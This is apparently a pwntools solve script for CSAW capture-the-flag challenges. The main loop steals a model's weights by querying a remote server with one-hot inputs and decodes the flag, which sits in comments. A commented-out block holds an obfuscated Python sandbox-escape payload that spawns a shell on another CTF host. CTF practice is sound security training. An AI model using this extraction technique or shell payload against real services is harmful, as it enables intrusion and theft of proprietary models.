# nc misc.csaw.io 3000

from pwn import *
import warnings,time
warnings.filterwarnings("ignore")

weights=[]
vals=[]
total=31

# [99, 115, 97, 119, 99, 116, 102, 123, 109, 48, 100, 51, 49, 95, 53]
# [99, 115, 97, 119, 99, 116, 102, 123, 109, 48, 100, 51, 49, 95, 53, 116, 51, 52, 49, 105, 110, 103, 95, 105, 53, 95, 98, 52, 100, 125]
#csawctf{m0d31_5t341ing_i5_b4d}
for i in range(35):
    if(i<14):
        continue
    vals=[]
    for j in range(total):
        if(i==j):
            vals.append(1)
        else:
            vals.append(0)
    # print(len(vals))
    io = remote('misc.csaw.io',3000)

    for j in range(3):
        print(io.recvline(timeout=2))

    # io.sendlineafter('Enter your input: ', b'0')
    c=0
    for val in vals:
    # for j in range(total):
        c+=1
        # time.sleep()
        io.sendline(str(val))
        
        x=io.recvline(timeout=5)
        print(c,val,": ",x)
        if(c==31):
            w=int(x)-125    # bias =125
            weights.append(w)
            print(f"w{j}: ",w)
    # x=io.recvline(timeout=2)
    io.close()
    print(weights)


# from pwn import *

# def exploit():
#     try:
#         # io = remote("pwn.chal.csaw.io", 5011)
#         io = remote("hack.scythe2021.sdslabs.co", 11437)
#         p = "globals()['_'+'_builtins__'].__dict__['__i'+'mport__']('o'+'s').__dict__['s'+'ystem']('s'+'h')"
#         # p = "globals()['_'+'_builtins__'].__dict__['__import__']('o'+'s').__dict__['s'+'ystem']('s'+'h')"

#         # p='print("hello")'
#         # io.sendlineafter(">>> ", p)
#         io.sendlineafter('[+] ', p)
#         io.interactive()
#     finally:
#         io.close()

# exploit()


        